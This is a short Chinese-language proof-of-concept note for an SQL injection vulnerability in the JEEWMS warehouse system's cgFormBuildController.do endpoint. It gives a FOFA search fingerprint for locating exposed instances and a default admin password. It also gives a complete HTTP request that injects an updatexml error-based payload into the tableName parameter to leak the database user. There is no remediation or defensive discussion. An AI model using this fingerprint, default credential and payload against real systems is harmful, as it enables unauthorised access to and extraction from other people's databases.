# JEEWMS系统cgFormBuildController.do存在SQL注入漏洞

JEEWMS系统cgFormBuildController.do存在SQL注入漏洞

## fofa

```javascript
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
```

## poc

默认密码：admin/llg123

```javascript
GET /jeewms/cgFormBuildController.do?mobileForm&tableName='and/**/updatexml(1,concat(0x7e,user(),0x7e),1)and' HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: JSESSIONID=638E9021C7F71842BDAD39D26DD10E48; JEECGINDEXSTYLE=ace; ZINDEXNUMBER=1990
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![image-20250220152053729](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502201520931.png)